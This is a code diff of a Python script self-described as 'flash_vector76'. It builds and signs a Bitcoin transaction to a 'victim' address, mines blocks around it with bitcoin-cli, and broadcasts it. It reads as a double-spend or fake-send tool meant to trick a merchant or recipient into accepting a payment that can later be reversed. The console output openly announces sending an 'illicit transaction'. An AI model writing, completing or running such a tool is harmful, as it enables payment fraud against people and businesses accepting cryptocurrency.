@@ -1,12 +1,25 @@
 import time
-import argparse
-import requests
-import subprocess
 import cryptos
+import requests
+import argparse
+import subprocess
 
 from bs4 import BeautifulSoup
 
-parser = argparse.ArgumentParser(description="How To Use flash_unconfirm")
+def generate_block(address, block, submit=False):
+    subprocess.run(['bitcoin-cli', "generateblock", address, f"['{block}']", str(submit).lower()],
+                             capture_output=True, 
+                             text=True,
+                             check=True)
+
+def send_rawtransaction(hextx):
+    result = subprocess.run(['bitcoin-cli', "sendrawtransaction", hextx],
+                             capture_output=True, 
+                             text=True,
+                             check=True)
+    return result.stdout
+
+parser = argparse.ArgumentParser(description="How To Use flash_vector76")
 parser.add_argument("send_from_wifkey",
                     help="Fake send btc from wif key.",
                     type=str)
@@ -25,36 +38,6 @@ parser.add_argument("--is_testnet",
 def to_satoshi(btc_amount):
     satoshi = 0.00000001
     return round(btc_amount / satoshi)
-
-def broadcast_transaction(raw_tx, testnet):
-
-    url = "https://live.blockcypher.com/btc/pushtx"
-    res = requests.get(url).text
-    bs = BeautifulSoup(res, 'html.parser')
-    csrf_token = bs.find(attrs={'name':'csrfmiddlewaretoken'}).get('value')
-    print(csrf_token)
-    if testnet:
-        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
-        payload = raw_tx
-        payload = {"tx_hex": raw_tx,
-               "coin_symbol": "btc-testnet",
-               "csrfmiddlewaretoken": csrf_token}
-    else:
-        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
-        payload = {"tx_hex": raw_tx,
-               "coin_symbol": "btc",
-               "csrfmiddlewaretoken": csrf_token}
-
-    response = requests.post(url,
-                             allow_redirects=True,
-                             data=payload,
-                             headers=headers)
-    print(f"response url : {response.url}")
-    if response.status_code == 200:
-        print("Transaction successfully broadcasted!")
-    else:
-        print(f"Failed to broadcast transaction. Status code: {response.status_code}")
-
 
 
 args = parser.parse_args()
@@ -88,14 +71,21 @@ if testnet:
 else:
     tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
 
-tx_victim = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
+tx_victim = transaction_util.mktx(inputs, tx_victim)
 if testnet:
     tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
 else:
     tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
 
+print("Generating block using vector76 method...")
+send_rawtransaction(tx_victim)
+for i in range(6):
+    print(f" {i + 1} / 6   ...")
+    generate_block(transaction_util.wiftoaddr(fake_send_from), tx_victim)
+print()
 print(inputs)
 print()
+print("[+] READY...")
 print()
 print("--------------------")
 print(f"Fake Send to                       : {victim_address}")
@@ -110,17 +100,12 @@ print()
 input(" --- If you really want to continue, press enter. --- ")
 print()
 print()
-print()
-print()
 print("Index > 強固なブロックチェーン技術に対して強制干渉を開始...")
 print()
-time.sleep(3) #詠唱中...  -u- 
-
-print("SND TMP ITX TOBC  (ブロックチェーンに一時的な不正なトランザクションを送信!)")
-
-
-#transaction_util.pushtx(tx_victim)
-broadcast_transaction(tx_victim, testnet)
+time.sleep(3) #..... -u-
+print("PUB ITX TOBC! (不正なトランザクションをブロックチェーンに公開!)")
+transaction_util.pushtx(tx_victim)
+time.sleep(2)
 print()
 #おまけ
 print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
@@ -144,5 +129,4 @@ print("----------------")
 balance = transaction_util.get_balance(victim_address)
 print(f"fake send to address Balance (satoshi unit) :{balance}")
 print()
-print("Tips : If you are unable to send from the program side, why not try sending manually using the service at the following URL?: https://live.blockcypher.com/")
 print("Done.")
